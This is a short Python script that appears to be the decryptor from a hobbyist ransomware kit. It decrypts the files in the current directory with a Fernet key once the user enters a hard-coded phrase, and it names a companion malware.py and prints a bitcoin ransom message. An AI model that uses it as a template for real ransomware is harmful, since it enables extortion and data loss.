#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#let's find some file

files = []

for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key",  "rb") as key:
	secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase\n")

if user_phrase == secretphrase:

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		try:
			contents_decrypted = Fernet(secretkey).decrypt(contents)
			with  open(file, "wb") as thefile:
				thefile.write(contents_decrypted)
			print(f"[+]File decrypted: {file}")
		except Exception as e:
			print(f"[-] Could not decrypted {file}: {e}")

	print("congrats, you're file are decrypted. Enjoy your coffee")
else:
	print("Sorry, wron secret phrase. Send me more bitcoin")
